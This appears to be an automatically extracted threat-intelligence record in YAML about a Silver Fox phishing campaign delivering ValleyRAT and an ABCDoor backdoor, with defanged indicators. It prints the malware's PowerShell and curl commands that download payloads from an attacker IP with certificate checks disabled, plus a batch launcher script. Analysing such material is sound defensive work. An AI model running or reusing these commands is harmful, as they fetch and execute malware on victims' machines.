@@ -1,0 +1,63 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T16:49:04.572077
+# Response length: 3520 chars
+# Input chunk preview: '=== ARTICLE BODY ===In December 2025, we detected a wave of malicious emails designed to look like official correspondence from the Indian tax service. A few weeks later, in January 2026, a similar ca'
+# ============================================================
+
+title: "Silver Fox Threat Group Campaign Using Modified RustSL Loader and ABCDoor Backdoor"
+description: A phishing campaign targeting Indian and Russian organizations used a modified Rust-based loader to deliver ValleyRAT and a new Python-based backdoor named ABCDoor.
+attribution: "Silver Fox threat group"
+malware_families:
+  - ValleyRAT
+  - ABCDoor
+cves: []
+ttps:
+  processes:
+    - Click File.exe
+    - powershell.exe
+    - cmd.exe
+    - pythonw.exe
+  command_lines:
+    - "powershell.exe -Command \"& {[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri 'hxxp://154.82.81[.]205/YD20251001143052.zip' -OutFile '$appdata\appclient\111.zip' -UseBasicParsing -TimeoutSec 600 } catch { exit 1 } }\""
+    - "curl.exe -L -o \"%LOCALAPPDATA%\appclient\111.zip\" \"hxxp://154.82.81[.]205/YD20251001143052.zip\" --silent --show-error --insecure --max-time 600"
+    - "cmd.exe /c \"C:\Users\<user>\AppData\Local\appclient\update.bat\""
+  powershell:
+    - "& {[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri 'hxxp://154.82.81[.]205/YD20251001143052.zip' -OutFile '$appdata\appclient\111.zip' -UseBasicParsing -TimeoutSec 600 } catch { exit 1 } }"
+    - "{[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri 'hxxp://154.82.81[.]205/YD20250923193706.zip' -OutFile '$appdata\appclient\111.zip' -UseBasicParsing -TimeoutSec 600 } catch { exit 1 } }"
+  scripts:
+    - "@echo off set \"script_dir=%~dp0\" set SRC_DIR=%script_dir% set DES_DIR=C:\ProgramData\Tailscale rmdir /s /q \"%DES_DIR%\" mkdir \"%DES_DIR%\" call :recursiveCopy \"%SRC_DIR%\" \"%DES_DIR%\" start "" /B \"%DES_DIR%\python\pythonw.exe\" -m appclient exit /b :recursiveCopy set \"src=%~1\" set \"dest=%~2\" if not exist \"%dest%\" mkdir \"%dest%\" for %%F in (\"%src%\\*\") do ( copy \"%%F\" \"%dest%\" >nul ) for /d %%D in (\"%src%\\*\") do ( call :recursiveCopy \"%%D\" \"%dest%\\%%~nxD\" ) exit /b"
+  registry_keys:
+    - HKCU:\Console\0
+    - HKCU:\Console\1
+    - HKCU:\Console\IpDate
+    - HKCU:\Software\IpDates_info
+  image_loads: []
+  network_connections:
+    - Click File.exe -> abc.haijing88[.]com:443
+    - Click File.exe -> hxxp://154.82.81[.]205/YD20251001143052.zip
+    - Click File.exe -> hxxp://154.82.81[.]205/YN20250923193706.zip
+  file_activity:
+    - C:\Users\<user>\AppData\Local\appclient\update.bat
+    - C:\ProgramData\Tailscale\
+  persistence:
+    - Phantom Persistence Module (Hijack Mode)
+  process_relations: []
+iocs:
+  hashes:
+    - e6362a81991323e198a463a8ce255533
+    - 2c5a1dd4cb53287fe0ed14e0b7b7b1b7
+    - 4a5195a38a458cdd2c1b5ab13af3b393
+    - e66bae6e8621db2a835fa6721c3e5bbe
+    - fc546acf1735127db05fb5bc354093e0
+    - 2375193669e243e830ef5794226352e7
+  ip_addresses:
+    - 154.82.81[.]205
+    - 207.56.138[.]28
+    - 127.0.0.1
+  domains:
+    - abc.haijing88[.]com
+  urls:
+    - hxxp://abc.haijing88[.]com/uploads//CBDT.rar
+    - hxxp://154.82.81[.]205/YD20251001143052.zip
+    - hxxp://154.82.81[.]205/YN20250923193706.zip
+authors: []
